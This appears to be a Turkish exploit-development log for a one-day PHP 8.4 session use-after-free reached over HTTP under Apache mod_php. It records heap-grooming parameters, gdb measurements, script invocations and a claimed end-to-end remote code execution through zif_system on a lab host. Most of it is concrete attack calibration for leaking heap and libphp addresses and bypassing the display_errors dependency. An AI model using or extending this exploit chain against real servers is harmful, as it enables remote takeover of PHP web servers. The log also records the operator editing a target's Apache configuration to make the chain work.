# display_errors'a bağlı olmayan sızıntı yolu: araştırma ilerlemesi

Tarih: 2026-10-21
Hedef: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (amd64)
Kısıtlar: saldırı isteği yalnızca HTTP kullanır; nihai hedefe insturmentasyon (probe) eklenmez.
Bu belgedeki tüm gdb ölçümleri **kalibrasyon lab'ı 172.16.1.112** üzerinde yapılmıştır,
172.16.0.103'e dokunulmaz.

Durum: **mekanizma çalışır olduğu doğrulandı, yalnızca son adım olan sayfa düzeyinde bellek
tükenmesi (page-level OOM) eksik**. `headers_sent`'i set etmek için artık
`display_errors=On` / `max_input_vars` warning çıktısı gerekmez.

---

## 1. Orijinal yol neden display_errors'a bağımlıydı

Aşama 1/2'nin A'sı şunlara ihtiyaç duyar:

```text
PS(send_cookie)=1
+
php_session_reset_id() başarısız (böylece send_cookie sıfırlanmaz)
+
A pre-RINIT'te OOM olur, PS(id) sarkan kalır
```

Orijinal uygulama, `max_input_vars` warning çıktısıyla `SG(headers_sent)`'i 1 yapıyordu;
böylece `php_session_send_cookie()` FAILURE dönüyordu. `php_error_docref`
`display_errors` tarafından kontrol edilir; Off iken warning yalnızca log'a yazılır, çıktı üretmez,
`SG(headers_sent)` hâlâ 0 olur, reset_id başarılı olur ve `send_cookie`'yi sıfırlar.

---

## 2. Doğrulanmış şekilde çalışmayan alternatifler

### 2.1 `Expect: 100-continue`

Apache, PHP işlemeden önce gerçekten şunu döndürdü:

```text
HTTP/1.1 100 Continue
```

Ama PHP'nin `SG(headers_sent)`'i hâlâ 0'dır. A'dan sonra:

```text
ps_globals.id          = 0x7ffff5e6e000
ps_globals.send_cookie = false
```

Bu, 100-continue'nun Apache katmanı olduğunu ve PHP SAPI'nin headers_sent'ini set etmediğini gösterir.
Bu yol elenir.

### 2.2 `sapi_header_op`'u geçersiz header ile başarısız kılmak

`php_session_send_cookie()`'nin `Set-Cookie` değeri `php_url_encode(PS(id))`'den gelir;
CR/LF/NUL hepsi `%XX` ile encode edilir; session_name INI'den gelir, saldırgan kontrol edemez.
`sapi_header_op`, headers_sent olmadığı durumda yalnızca header CR/LF/NUL içerdiğinde
başarısız olur; bu kurgulanamıyor. Bu yol elenir.

### 2.3 Uzaktan display_errors / error_log değiştirmek

`display_errors` ve `error_log` ikisi de PHP_INI_ALL/PERDIR'dir, ancak saldırganın hedef tarafı
kod yürütme ya da `.htaccess` yazma yetkisi yoktur; `PHP_VALUE` yalnızca CGI/FastCGI'nin
yapılandırma kanalında geçerlidir, mod_php altında istek başlıklarından enjekte edilemez.
Bu yol elenir.

---

## 3. Çalışan mekanizma: OOM'un `php_session_reset_id()` içinde gerçekleşmesi

`ext/session/session.c`'nin sırası:

```c
/* php_session_initialize() */
if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {
    ...
    PS(id) = create_sid();
    if (PS(use_cookies)) {
        PS(send_cookie) = 1;          /* <-- önce 1 yapılır */
    }
}
if (php_session_reset_id() == FAILURE) { ... }
```

`php_session_reset_id()`:

```c
if (PS(use_cookies) && PS(send_cookie)) {
    cookies_sent = php_session_send_cookie();
    if (cookies_sent == FAILURE) return FAILURE;
    PS(send_cookie) = 0;              /* <-- yalnızca başarılı gönderimde sıfırlanır */
}
```

`php_session_send_cookie()` içinde tahsis edilmesi gerekenler:

- `smart_str`'in Set-Cookie başlığı (~64B seviyesi)
- `php_url_encode(PS(id), 32)` → `zend_string_safe_alloc(3, 32)`:
  `24 + 96 + 1 = 121` → **128B bin**

Eğer bu tahsisler `zend_mm` içinde başarısız olursa, `zend_bailout` doğrudan istek
shutdown'ına atlar, `PS(send_cookie)` 1 kalır; A'nın big field'ı isteği pre-RINIT'te OOM yapmaya
devam eder, `PS(id)` sarkan kalır. Tüm bu süreç hiçbir warning çıktısı gerektirmez.

---

## 4. Lab doğrulaması (172.16.1.112, display_errors=Off)

### 4.1 A şekli

`tools/send_a_oomreset.py` / `send_a_bin128.py` / `send_a_longfile.py`:

```text
PHPSESSID = "\x00"
PHP_SESSION_UPLOAD_PROGRESS = "pwn"
997 adet kayıtlı padding alanı (değer boyutu kontrol edilebilir)
file alanı (filename uzunluğu kontrol edilebilir)
```

12MB big field yok; OOM, padding/dosya başlığı tarafından pre-RINIT'te tetiklenir.

### 4.2 Kritik ölçümler

`php_session_reset_id` girişinde gdb ile Zend MM okumak:

```text
V=3000, 997 fields, N128=128:
RESET send=1 size=5878488 real=6291456 limit=8388608 rem=2097152 slot11=(nil) mainfree=0 chunks=3
RESET send=0 ...
```

- `size` zaten ~5.9M'ye ulaşmış, ama `real_size` yalnızca 3 chunk = 6M,
  `rem = limit - real_size = 2MB` tam olarak bir yeni chunk daha almaya yeter;
- 128B bin (`free_slot[11]`) boştur;
- cookie'nin 128B sayfa tahsisi hâlâ başarılı olur (mevcut chunk'ın boş sayfasından ya da yeni chunk'tan).

V=3200 iken padding alanının `php_sapi_filter → zend_string_init(3200)`'ü
tam olarak **FILE_START'tan önce** OOM olur:

```text
MM_SAFE_ERROR limit=8388608 size=8256744
#4 zend_string_alloc(len=3200)
#6 php_sapi_filter
#7 rfc1867_post_handler
```

Bu, Zend MM'in başarısızlık noktasının "yeni bir 4KB sayfa gerekiyor ama yeni bir 2MB chunk yok"
olduğunu gösterir:

```text
ZEND_MM_CHUNK_SIZE (2MB) > limit - real_size  -> yeni chunk reddedilir
```

### 4.3 Şu anda eksik olan tek adım

Uzun bir filename ile (file part'ın `filename`'i, interned değil, belleğe sayılır)
`real_size`'ı limite itmek:

```text
F=688128:
RESET send=1 size=7954856 real=8388608 limit=8388608 rem=0 slot11=(nil)
CHUNK 0 free_pages=0
CHUNK 1 free_pages=0
CHUNK 2 free_pages=68
CHUNK 3 free_pages=4
```

- `rem=0`: artık yeni chunk alınmaz;
- 128B bin boş: cookie'nin yeni sayfaya ihtiyacı var;
- ancak 4 chunk içinde **hâlâ 72 boş sayfa kalmış**; cookie'nin 128B sayfası
  chunk 2/3'ün boş sayfasından başarıyla tahsis edilir → `send_cookie` sıfırlanır; A'nın sonraki
  tahsisi ancak o zaman OOM olur (id sarkan ama send_cookie=false).

F'yi 4KB granülerliğinde taramak:

```text
F=688128  RESET send=1 real=8M rem=0 slot11=NULL  free_pages=0,0,68,4   (72)
F=692224  RESET send=1 real=8M rem=0 slot11=NULL  free_pages=0,0,68,1   (69)
F=696320  NO_RESET (FILE_START'tan önce OOM olur)
```

Yani filename tek başına boş sayfa sayısını en fazla 69'a kadar indirebilir; 4KB daha eklenince
filename/header tahsis aşamasında önce OOM olur ve kalan 69 sayfa hep cookie'ye kalır.

**Hedef durum**: ilk `php_session_reset_id` anında

```text
real_size == limit
rem == 0
free_slot[11] == NULL
tüm chunk'lar free_pages == 0
```

Bu durumda cookie'nin 128B sayfa tahsisi başarısız olur ve `send_cookie` 1 kalır.

---

## 4.4 Aşıldı: display_errors=Off altında A primitifi

Nihai kullanılabilir A (kalibrasyon lab'ı, display_errors=Off):

```text
python3 send_a_idmain.py 129 3000 570 3040 20 1
  parametreler: N128=129, V=3000, NH=570, HL=3040, NS=20, N64E=1
```

A'dan sonra:

```text
ps_globals.id          = 0x7ffff5e6e080   (main chunk, page 0x6e)
ps_globals.send_cookie = true
```

Kilit noktalar:

1. **997 padding alanı** heap'i `real_size = limit = 8M`'ye iter;
2. **NH=570 adet 3040 baytlık bilinmeyen header** chunk boş sayfalarını 0'a indirir;
3. **N128=129 adet 103 baytlık değer** 128B bin'i boşaltır (cookie'nin `url_encode` tahsisi);
4. **NS=20 adet 15 baytlık header** 40B bin'i boşaltır (cookie'nin ilk
   `"Set-Cookie: "` smart_str tahsisi);
5. `php_session_send_cookie` çağrıya girdiğinde:
   `slot4 != NULL, slot11 == NULL, sum(free_pages) == 0`;
   40B tahsisi mevcut slotu kullanır, 128B tahsisi kullanılabilir sayfa bulamaz → OOM;
6. `send_cookie` 1 kalır, `PS(id)` sarkan olur, child hayatta kalır;
7. **N64E=1 adet 39 baytlık sıradan alan padding'in başına konur**, böylece 64B bin
   main chunk'ta önceden bir sayfa tahsis eder; sonraki id bu sayfayı yeniden kullanır ve
   `chunk+0x6e080`'e düşer, shutdown ile serbest bırakılan main-olmayan chunk'a değil.

Fiilî post-A:

```text
NS=12/20/27:
$1 = 0x7ffff3dff000  $2 = true     # erken sürüm (id chunk3'te)
N128=129, N64E=1:
$1 = 0x7ffff5e6e080  $2 = true     # id main chunk'ta
```

İşte bu, **tamamen display_errors'a bağlı olmayan** `send_cookie=1 + sarkan PS(id)`'dir.

---

## 5.1 B sızıntısının mevcut kalibrasyon durumu

B'nin `0x7ffff5e6e080`'i (64B hizalı, page 0x6e, sayfa içi 0x80) sahte bir zend_string ile
yeniden işgal etmesi gerekir. Mevcut ilerleme:

- A'nın id sayfası `0x6e000`, B cleanup sırasında **16B bin** tarafından yeniden tahsis edilir
  (`map[0x6e]=0x80000001`), id bloğu 16B free-list zincirine dönüşür;
- B'nin forge raw'ının fiilî adresi (`php_sapi_filter`, val_len dalı):
  - 32B forge: `0x7ffff5e011a0` (page 0x1)
  - 64B forge: B'nin 64B bin'i de 0x6e'yi talep etmedi;
- Nedeni: Zend MM'in bin sayfa tahsisi öncelikli olarak düşük adresli boş sayfayı alır; A'nın id
  sayfası 0x6e, A heap'i neredeyse dolunca aldığı bir sayfadır, B'nin 32B/64B bin'i önce düşük
  sayfaları alır (0x1, 0x2…), 16B/8B'nin geçici string'leri ise 0x6e'yi önce talep eder.
- B'nin multipart kurgu hatası düzeltildi: header ile body arasında mutlaka
  `\r\n\r\n` olmalı; aksi hâlde forge/PHPSESSID/progress değerlerinin uzunlukları sıfır olur.

Bir sonraki adım (öncelik sırasına göre):

1. **Sayfa yönlendirme (page steering)**: B'nin forge part'ından önce büyük bir alan
   (ya da bir grup orta boy alan) koyarak düşük adresli boş sayfaları tüketmek, böylece
   32B/64B bin'in bir sonraki sayfası 0x6e'ye düşer; ardından slot sayısına göre 4 adet
   32B live header (slot0–3) ve 32B forge raw (slot4=id) yerleştirmek.
2. **A id sayfasını kaydırmak**: N64E'yi (erken 39B alan sayısı) ya da padding sırasını
   değiştirip id sayfasını B'nin 32B/64B bin'inin fiilen kullandığı düşük sayfaya düşürmek;
   id mutlaka main chunk'ta olmalı, aksi hâlde shutdown o chunk'ı serbest bırakır.
3. **16B geometrisi**: id sayfası zaten 16B bin tarafından yeniden tahsis edilmiş; eğer 16B
   yolu izlenecekse, cleanup sırasında iki 16B slot'un hâlâ live ve içeriği kontrollü olması
   gerekir (şu anda raw/param her ikisi de free-list next ile üzerine yazılır), zorluğu daha yüksektir.

### 5.2 64B geometrisi: isabete bir sayfa kaldı

Multipart boş satırı düzeltildikten sonra, 64B B'nin forge raw'ının fiilî değeri:

```text
b_forge64_first (2 adet 39B header + forge 63B, forge part en önde):
  FORGE raw = 0x7ffff5e6f000   (page 0x6f, slot0)

b_forge64_pre (2 adet 39B sıradan alan + forge 63B):
  FORGE raw = 0x7ffff5e6f100   (page 0x6f, slot4)
```

A'nın id'si:

```text
0x7ffff5e6e080   (page 0x6e, slot2)
```

Yani 64B bin'in yeni sayfası kararlı şekilde **0x6f**'ye düşer, A'nın id sayfası 0x6e ise
16B/32B'nin geçici string'leri tarafından önce talep edilir (B cleanup sırasında `map[0x6e]`
bir ara `0x80000001`'di). İkisi arasında yalnızca bir sayfa fark var.

A id'yi 0x6f'ye taşıma denemesi: erken 39B alan sayısını N64E=64'e çıkarmak
(N128=192), 0x6e'nin 64 adet 64B slotunu doldurmak. NH yeniden ayarlanan sonuçlar:

```text
NH=632  RESET send=1 free=31 SEND0=1  POST id=0 send=false
NH=660  RESET send=1 free=3  SEND0=0  POST id=0 send=false
NH=670  NO_RESET
```

reset'e ulaşılabiliyor, cookie de başarısız olabiliyor, ancak A'nın child'ı shutdown sonrası
değiştiriliyor ve `PS(id)/send_cookie` kayboluyor. 64B hizalamasını tamamlamak için şunlar gerekir:

1. N64E=64 civarında A'nın child'ını hayatta tutmak (NH/NS/N128 değiştir, ya da erken
   64B alanını farklı bir konuma koy), böylece id 0x6f000/0x6f100'e düşer ve
   post-A `send_cookie=true` olur; ya da
2. B'nin 64B bin'inin 16B/32B'den önce page 0x6e'yi talep etmesini sağlamak (istek
   başlangıcında/ilk birkaç part'tan önce 64B sayfa tahsisini zorla, 16B/32B'nin sayfayı
   kapmasını engelle).

### 5.3 En son hizalama deneyi (hâlâ isabet yok)

- **B sayfası 0x6f'de sabit**: forge part sırası, pre alanı, HTTP `X-A/X-B`
  39B header, 39 karakterlik Host, 17S boundary ne olursa olsun, 64B forge raw her zaman
  `0x7ffff5e6f000` (forge part en önde) ya da `0x7ffff5e6f100` (iki pre). İstek başlangıcının
  server var/bin sayfa rekabeti, 0x6e'nin önce 16B/32B tarafından kapılmasına yol açar,
  64B bin 0x6f'yi alır.
- **A tarafında id'yi kaydırmak**:
  - `N64H=62` adet 39B header, NH=565: child hayatta kalır, ama id hâlâ
    `0x6e080`'dir (header bu head slotu tüketmiyor);
  - `N64H=63..70`: id hâlâ `0x6e080`;
  - `N64H=80`: id `0x7ffff5dfef40`'a atlar (hedef sayfa değil), send=false;
  - kuyrukta K adet 39B live + 1 adet 63B raw alan (LIFO id'nin raw slotu almasını sağlar):
    K=1..16, NH=570+K altında child id'yi korumuyor;
  - `N64E=64` 0x6e'nin 64 adet 64B slotunu doldurur, NH=632..660 iken reset'e ulaşılabiliyor,
    cookie başarısız olabiliyor, ama A child shutdown sonrası değiştiriliyor, post id=0.

Sonuç: A primitifi kararlı, B'nin 64B forge'u yalnızca bir sayfa eksik; ama A'nın id'sini
0x6f000/0x6f100'e düşürüp aynı zamanda child'ı hayatta tutmak, ya da B'nin 64B bin'ine 0x6e'yi
kaptırmak için heap/page sırasını ayarlamaya devam etmek gerekir.

B'nin forge raw'ı `0x7ffff5e6e080`'e düştüğü anda, `Set-Cookie` `len=0x1000`'lik sınır-dışı
okumaya dönüşür ve sonrasındaki B decode/chunk base akışı orijinal display_errors yolundan
tamamen aynıdır.

---

## 5. Kalan sayfaların tüketim stratejisi

72 boş sayfa (288KB), **filename'den sonra, reset'ten önce** tüketilmelidir, ancak boş sayfa
sayısını aşan geçici bir tepe (peak) oluşmamalıdır. Doğrulanmış kısıtlar:

- Alan adları interned'dir (`php_register_variable_quick` →
  `zend_string_init_interned`), **memory_limit'e sayılmaz**; alan adını uzatmak işe yaramaz.
- Tek bir devasa padding alanı (>3072), filter içinde raw buffer + value string'i aynı anda
  barındırır, tepe ~2× olur ve erken OOM yapar.
- Uzun filename de header line + filename olmak üzere iki kopyaya sahiptir, tepe ~2×; F=688K iken
  72 sayfa kalır, F≥720K ise erken OOM olur.

Uygulanabilir yönler (öncelik sırasına göre):

1. **Sıralı birden çok orta boy tahsis, geçici buffer iki tahsis arasında serbest bırakılır**
   - örneğin file part'ın birden çok uzun header değeri (filename, Content-Type) ya da
     birden çok orta boy value alanı;
   - her tahsisin tepesi 2×, ama öncekinin raw/line buffer'ı serbest bırakıldıktan sonra sonraki yapılır;
   - net live büyümesi 72 sayfayı adım adım yiyebilir, bu arada tepe kalan sayfaları aşmaz.
2. **Kalan sayfa tüketimini FILE_START içinde filename'den sonraya koymak**
   - filename'in kendisi zaten reset'ten önceki son büyük live string'tir;
   - eğer FILE_START'tan önce ama tahsisi filename'den sonra olan bir uzun string daha
     eklenebilirse (ör. Content-Type), tepeyi artırmadan daha fazla sayfa tüketilebilir.
3. **Birden çok küçük bin'in live değeri/sayfa tahsisiyle kalan sayfaları doldurmak**
   - Kalan 69 sayfa chunk 2/3'ün free_pages'indedir, **sayfa düzeyinde boş sayfalardır**;
     filename'in büyük tahsisi bunları kullanmaz (free_pages değişmez).
   - reset'ten önce **bin slow path**'in defalarca yeni sayfa tahsis etmesi gerekir ki bu 69
     sayfa tek tek yensin; örneğin 997 padding alanının value boyutunu birden çok bin'e dağıtmak,
     her bin'in mevcut sayfasını tam dolduracak ve sonraki alanın yeni sayfa tetiklemesini sağlayacak şekilde.
   - Her yeni bin sayfası 1 free_page tüketir; hedef, ilk reset anında
     `sum(free_pages)==0` olması ve ardından cookie'nin 128B yeni sayfa tahsisinin başarısız olmasıdır.
   - Tek bir alanın 2× tepesi yine toplam live'ı sınırlar; birden çok orta boy alan kullanmak ve
     raw buffer'ı alanlar arasında serbest bıraktırmak adım adım ilerlemeyi sağlar.

Her parametre ayarından sonra kalibrasyon lab'ında `tools/chunks2.gdb` ile ilk reset'in
`real/rem/slot11/her chunk free_pages`'ine bakın; isabet sağlandığında A'dan sonra şunlar görülmeli:

```text
ps_globals.id          != 0
ps_globals.send_cookie == true
```

Sonra B yine eski 80B/64B forge B'yi kullanır, yalnızca yeni A'ya göre id blok adresini
(B'nin K/offset'i) yeniden kalibre etmek gerekir; sızıntı artık display_errors'a bağlı değildir.

---

## 6. Dosyalar

| Dosya | Amaç |
|---|---|
| `tools/send_a_oomreset.py` | Temel OOM-reset A (N adet V baytlık alan + file) |
| `tools/send_a_bin128.py` | 103B değerle 128B bin'i doldurma (cookie'nin e_id'si aynı bin) |
| `tools/send_a_longfile.py` | Uzun filename (interned değil) ile chunk boş sayfalarını tüketme |
| `tools/mem2.gdb` | reset girişinde size/real/limit/rem/slot11 yazdırma |
| `tools/chunks2.gdb` | Tüm chunk'ların free_pages'ini yazdırma |
| `tools/oomsite2.gdb` | `zend_mm_safe_error`'ın çağrı noktası ve backtrace'ini yakalama |

---

## 7. Sonuç

- Orijinal yolun `display_errors` bağımlılığı, warning çıktısının `headers_sent`'i set etmesinden kaynaklanıyordu;
- `100-continue`, geçersiz header, uzaktan INI değiştirme hepsi uygulanamaz;
- **OOM'un `php_session_reset_id()` içinde gerçekleşmesi** uygulanabilir bir alternatiftir:
  kalibrasyon lab'ının `display_errors=Off` ortamında heap `real=limit, rem=0,
  128B bin boş` durumuna itildi, yalnızca son 72 chunk boş sayfasının tüketilmesi eksik;
- **A tarafı aşıldı**: `send_a_idmain.py 129 3000 570 3040 20 1`,
  display_errors=Off altında `send_cookie=1` ve id main chunk'ta
  (`chunk+0x6e080`) olacak şekilde sarkan PS(id) bırakıyor;
- Kalan iş yalnızca B'nin fake zend_string düşüş noktası kalibrasyonudur (sayfa yönlendirme/slot
  hizalaması), yeni bir primitif değildir.

---

## 8. RCE doğrulaması ve display_errors bağımlılığının nihai durumu (2026-10-21 20:16)

### 8.1 Referans lab üzerinde RCE kanıtı

`172.16.0.103` üzerinde (ASLR-on, tek worker prefork)
`tools/pure_aslr_run.sh` orijinal zinciri çalıştırıldı:

```text
W1=925534  chunk=0x7f2517800000  attempt=1
W2=925632  libphp=0x7f2516000000 attempt=1
W3=925730  HTDATA=0x7f251786e0d8 ZIF=0x7f251643a870 attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Yani: iki `Set-Cookie` sızıntısı (chunk, libphp) + `zif_system`
(`libphp+0x43a870`) ile uçtan uca RCE; saldırı istekleri tamamen HTTP.

### 8.2 Bu zincirin display_errors bağımlılığı

`send_a_leak2/leak3`'ün A'sı, `max_input_vars` warning çıktısıyla `SG(headers_sent)`'i 1 yapmaya
bağımlıdır; bu da `php_session_reset_id()`'nin `php_session_send_cookie()`'den önce başarısız
olmasını sağlar ve `send_cookie=1` olan sarkan `PS(id)`'yi bırakır. `display_errors=0` iken
warning çıktı vermez, `headers_sent` set edilmez, A'nın reset'i normal şekilde cookie gönderir ve
`send_cookie`'yi temizler, B'nin END cleanup'ında sızıntı olmaz.

Fiilî test: `.103` mevcut varsayılan `display_errors 0` iken aynı sürücü doğrudan çalıştırıldığında:

```text
W1=924738 chunk=0x0 attempt=1
W1=924835 chunk=0x0 attempt=2
W1=924933 chunk=0x0 attempt=3
HEAP_LEAK_FAILED
```

RCE'nin kendisini doğrulamak için, bu sefer `.103`'ün
`/etc/apache2/conf-enabled/php8426.conf` dosyasındaki `display_errors`
`0`'dan `1`'e geçici olarak değiştirildi, çalıştırma bitince `0`'a geri döndürüldü ve
`apache2ctl -k restart` yapıldı; şu anda `curl 127.0.0.1:8088/index.php` `OK` döndürüyor.

### 8.3 display_errors=Off yolunun mevcut durumu

A tarafı (warning yok, çıktı yok) kalibrasyon lab'ında aşıldı:

```text
A: tools/send_a_plain.py 129 3000 570 3040 20 1
RESET send=1 real=8388608 limit=8388608 rem=0 slot11=NULL
B cleanup: PS(id)=0x7ffff5e6e080 send=1, page 0x6e
```

B tarafı hâlâ isabet etmedi. A'nın id'si fiilen 32 karakterlik rastgele session id'dir (64B
zend_string, 64B sayfa 0x6e'nin slot2'sinde); B'nin 64B forge raw'ı kararlı olarak
page 0x6f'ye düşer (`0x7ffff5e6f000`/`…f100`), oysa page 0x6e B'nin request startup'ında
16B/32B geçici string'leri tarafından önce kapılır (cleanup sırasında `map[0x6e]=0x80000001`).
32B varyantı (forge raw page 0x1 slot13) ve 8 karakterlik PHPSESSID varyantı
(id 32B olur, ama chunk1'in 0x…1d7 sayfasına düşer) de denendi, hiçbiri A'nın id
sayfasıyla/slotuyla hizalanmadı.

Bir sonraki adım yine aynı hizalama problemidir:
- A'nın 64B id sayfasını B'nin 64B sayfası yapmak (0x6e vs 0x6f), ya da
- B'nin 64B bin'inin 16B bin'den önce page 0x6e'yi almasını sağlamak (HTTP 39B başlıkları mevcut
  sayfayı doldurmak raw sayfasını değiştiremedi), ya da
- 8 karakterlik id ile id'yi B'nin 32B sayfası 0x1 slot13'e koymak (A'nın 32B
  sayfa/slot kalibrasyonu gerekir).

Bundan önce, `display_errors=0` olan saf HTTP zinciri henüz RCE'ye ulaşmadı; kanıtlanmış olan RCE,
referans yapılandırmasının (`display_errors=On`) altındaki tam zincirdir.

---

## 9. Saf HTTP B'nin en son konumlandırması (2026-10-21 20:30)

### 9.1 0x6e sayfasını kapan çağrı noktası

`.112` üzerinde `tools/slowbins.gdb` ile (break `zend_mm_alloc_small_slow`)
B'nin 16B slow path'i yakalandı:

```text
SLOW bin=1 map6e=0x0
#1 _estrdup (s="Y-000")
#2 multipart_buffer_headers ... main/rfc1867.c:413
```

Yani: B'deki ilk bilinmeyen multipart header'ın **adı** (ör. `Y-000`, 6B)
önce 16B bin'in slow path'ini tetikler ve A'dan kalan 0x6e sayfasını 64B/24B'den 16B'ye kapar.

### 9.2 24B slot forge denemesi

A'nın id işaretçisi `0x…6e080`, B'nin 24B sayfasında `ZSTR_LEN`
`0x…6e090`'da (slot6) bulunur. "Son part'ın bilinmeyen header değeri"
(23B → 24B smart_string, END cleanup anında hâlâ canlı) ile slot6'ya
`len=0x1000` yazma denendi:

- `tools/b_24hdr.py`, `b_24cookie.py`, `b_24hold.py` (24B sayfayı tutmaya çalışan 200 adet
  15B dummy header içerir);
- sonuç: cleanup sırasında page 0x6e hâlâ `map=0x80000001` (16B),
  `0x6e090 = 0x…6e080` (16B free-list next), B'nin yanıtı boş
  (`php_url_encode` devasa len okur → OOM/bailout).

Kök neden: multipart header bir C string'idir. `len=0x1000`'in küçük-endian ilk baytı
`0x00`, `smart_string_appends`/`strlen` tarafından kesilir; 24B tahsisi ise value uzunluğunun
17–23 olmasını gerektirir, ilk 8 bayt aynı anda hem sıfır-olmayan hem de küçük bir tam sayı
oluşturamaz. Body değeri raw buffer'ı ikili (binary) güvenli olabilir, ama kayıttan hemen sonra
free edilir, ilk 8 bayt free-list next ile üzerine yazılır; 24B forge yolu esasen tıkanmıştır.

### 9.3 A id sayfa taraması

```text
N64E=1   id=0x…6e080   (main chunk)
N64E=65  id=0x…83080   (64B sayfa 0x83)
N64E=66  id=0x…83100
N64E=67  id=0x…83180
N64E=64/N128=192/NH=580  id=0x…5dab000 (chunk1)
N64E=64/N128=129/NH=570  id=0x…3dfe000 (chunk1)
```

B'nin 64B sayfası her zaman 0x6f'dir (`b_forge64_first` raw=0x…6f000),
A'nın 64B sayfası 0x6e/0x83/chunk1'dir; ikisinin kararlı bir kesişimi yoktur.

### 9.4 Sonuç

- 1day RCE'nin kendisi `display_errors=On` referans yapılandırmasında uçtan uca kanıtlandı (bölüm 8);
- `display_errors=Off`'un A primitifi geçerlidir, B sızıntısı hâlâ Zend MM sayfa tahsisinde takılı:
  A'nın id sayfası (64B) ile B'nin alabildiği 64B/32B/24B sayfaları örtüşmüyor, ayrıca 24B
  C-string forge'u NUL ile sınırlı;
- Bir sonraki adım ya id'yi B'nin 64B ilk sayfası 0x6f'ye tam olarak koyacak yeni bir A şekli bulmak,
  ya da sızıntı primitifini değiştirmektir (örneğin B'nin gerçekten A'nın 24B/64B sayfasını alıp
  canlı tutması).

---

## 10. 8B free-list ve uzun header adı ile iki yeni deneme (2026-10-21 20:50)

### 10.1 8B free-list fikri

Eğer A'nın id sayfası 0x6e B içinde 8B bin tarafından alınırsa, 8B slot ile
`ZSTR_LEN` forge edilebilir: 7 baytlık bir body değeri raw'ı 8B bin'de free edildiğinde, bin'in
free list'i boşsa slot'un ilk qword'ü 0 yazılır; ardından aynı slot 1 karakterlik
header adı `A` (`estrdup` 2B, 8B bin) tarafından yeniden kullanılır, `A\0` yazılır, eski qword 0
`ZSTR_LEN = 0x41` yapar, `0x6e098`'den 65 bayt okunur ve bu, komşu
free-list heap işaretçisini de getirmeye yeter.

`tools/b_8tail.py` bu şekle göre kurgulanmış (16 adet kısa adlı header + 7 baytlık body
+ progress part'ın 6 adet `A: B`'si), ama cleanup sırasında:

```text
CLEANUP id=0x7ffff5e6e080 send=1
page=0x6e map=0x80000001       # hâlâ 16B
0x6e090: 0x7ffff5e6e080        # 16B free-list next
```

16B bin (`form-data`/server var vb.) hâlâ 8B'den önce 0x6e'yi alıyor.

### 10.2 Uzun header adı A

A'nın 570 header adını 10 karakterden 16 karaktere çıkarma denemesi (`_estrdup`
17B → 24B bin), A'nın 16B bin'inin 570 adla dolmasını önlemek ve böylece B'nin ilk
16B tahsisinin slow path'i tetikleyip 0x6e'yi kapmasını sağlamak içindi:

```text
A: send_a_longhdr.py 129 3000 570 3040 20 1
sonuç: reset breakpoint'i isabet etmedi (A header aşamasında OOM oldu, id üretilmedi)
B: b_forge64_first raw=0x7ffff5e6f000 (hâlâ 0x6f sayfası)
```

Uzun adın eklediği ~7KB, A'nın OOM'unu reset'ten öne çekti; reset OOM'u ve 16B bin durumunu aynı
anda korumak için NH'yi yeniden ayarlamak gerekir, ama B'nin raw sayfası hâlâ 0x6f'dir.

### 10.3 Özet

0x6e sayfasının B içindeki sahiplenme sırası fiilen şöyle ölçüldü:

```text
16B (_estrdup/form-data)  >  24B  >  8B  >  64B
```

A'nın id sayfası (64B) her zaman daha küçük bir bin tarafından önce alınıyor; A tarafında header
adı uzunluğunu değiştirmek OOM'u öne çeker. Isınma (warm-up) geçmişi, 8B free-list, 24B header
değeri, uzun header adı — dördü de denendi, yine de B'nin fake'ini A id'sinin `len` alanına
yazmak başarılamadı.
